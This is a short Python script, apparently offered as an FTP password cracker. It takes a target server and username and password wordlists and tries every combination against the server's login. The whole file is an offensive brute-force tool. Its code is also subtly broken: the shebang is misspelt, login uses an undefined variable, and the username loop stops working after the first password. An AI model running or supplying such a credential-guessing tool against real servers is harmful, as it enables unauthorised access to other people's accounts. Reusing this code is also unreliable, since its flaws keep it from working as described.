#!/usr/bin/pyhon3
# FTP server password cracker
import ftplib

# Gets input
server = input("FTP Server: ")
usrList = input("Path to username wordlist: ")
passList = input("Path to password list: ")

# Executes
try:
	with open(passList, 'r') as pw:
		try:
			with open(usrList, 'r') as usr:
				for word in pw:
					for name in usr:
						# Removes return chars
						word = word.strip("\r").strip("\n")
						name = name.strip("\r").strip("\n")
						try:
							ftp = ftplib.FTP(server)
							ftp.login(user, word)
							print("Success! The password is " + word)
						except:
							print("Still trying...")
		except:
			print("Username list read error!")
except:
	print("Wordlist read error!")

